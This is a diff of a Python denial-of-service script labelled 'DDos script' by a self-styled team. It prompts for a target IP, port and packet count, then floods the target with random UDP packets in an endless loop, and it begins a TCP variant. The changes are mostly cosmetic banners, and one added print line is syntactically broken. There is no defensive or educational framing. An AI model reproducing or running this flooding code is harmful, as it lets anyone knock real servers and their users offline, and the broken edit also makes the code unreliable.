@@ -21,10 +21,10 @@ print(green + f"З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
 
-print("=================")
-print("=======🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼=======")
-print("===DDos script===")
-ip = str(input(" Ip ════> "))
+print("=============")
+print("=🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼=")
+print("=DDos script=")
+ip = str(input(" IP ════> "))
 port = int(input(" Port ════> "))
 choice = str(input(" Lanjut gak ?(y/n) ════> "))
 times = int(input(" Packets time ════> "))
@@ -42,22 +42,24 @@ print ("[===============    ] 75%")
 time.sleep(3)
 print ("[===================] 100%")
 time.sleep(2)
+os.system("clear")
+time.sleep(2)
 def run():
   data = random._urandom(1024)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[*]","[!]","[x]","[#]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" |####/[LOG] GO {sent}\####|")
+      print(i + green + f"|###[Ddos Attack] GO [Server]###|")
     except:
-      print("[!] |####/[LOG] GO {sent}\####|")
+      print([!] red + f"|###[Ddos Attack] GO [Server]###|")
 
 def run2():
   data = random._urandom(16)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[*]","[!]","[x]","[#]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
